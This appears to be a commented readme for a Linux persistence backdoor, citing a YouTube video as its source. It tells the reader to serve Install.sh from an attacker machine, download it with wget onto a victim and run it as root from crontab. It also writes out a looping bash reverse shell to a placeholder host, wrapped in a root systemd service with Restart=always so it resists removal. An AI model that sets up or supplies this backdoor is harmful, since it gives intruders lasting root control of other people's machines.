#Source: https://www.youtube.com/watch?v=fYQBvjYQ63U

#Automated method:
#1. Change directory to where the Install and Uninstall Shell scripts are located.
#2. Start the python http server on the attacker machine.
#	a. i.e. "python3 -m http.server 8000"
#3. Download the Install.sh script on the victim machine.
#	a. i.e. "wget http://10.0.0.7:8000/Install.sh"
#4. Change the Install.sh to executable on the victim machine.
#	a. i.e. "chmod +x ./Install.sh"
#5. Setup an /etc/crontab job to run the Install.sh file.
#	a. i.e. "* * * * * root /root/Install.sh"
#	b. Wait approximately a minute and you'll have the shell

#Setting it up by-hand:
#Requirements:
#1. Persistence Service.sh File:
#Location: /srv/Persistence_Service/Persistence_Service.sh
#Contents:
##!/bin/bash
#while true
#do
#	bash -i >& /dev/tcp/X.X.X.X/YYYY 0>&1
#	sleep 1m
#done
#
#2. Persistence Service SERVICE:
#Location: /etc/systemd/system/Persistence_Service.service
#(Ensure that the filename's extension is ".service"!)
#Contents:
#[Unit]
#Description=Persistence Service
#After=network.target
#
#[Service]
#ExecStart=/srv/Persistence_Service/Persistence_Service.sh
#Restart=always
#WorkingDirectory=/srv/Persistence_Service
#User=root
#Group=root
#
#[Install]
#WantedBy=multi-user.target
#
#3. Enabling the Service
#systemctl enable Persistence_Service
#systemctl start Persistence_Service
#systemctl daemon-reload
#(The Daemon Reload is very important!)
#systemctl restart Persistence_Service
#

#Validation:
#systemctl status Persistence_Service
#(Should say Active or Running)

#To Stop:
#systemctl stop Persistence_Service
#Note that keeping "Restart=always" in the service file will force the service to restart..
#It's this stubborn by design, so to uninstall it, concatenate the kill-string (second line):
#	i.e. "systemctl disable Persistence_Service
#	      systemctl stop Persistence_Service && rm -Rf /srv/Persistence_Service && rm -f /etc/systemd/system/Persistence_Service.service
#	      systemctl daemon-reload"

#To Disable:
#systemctl disable Persistence_Service

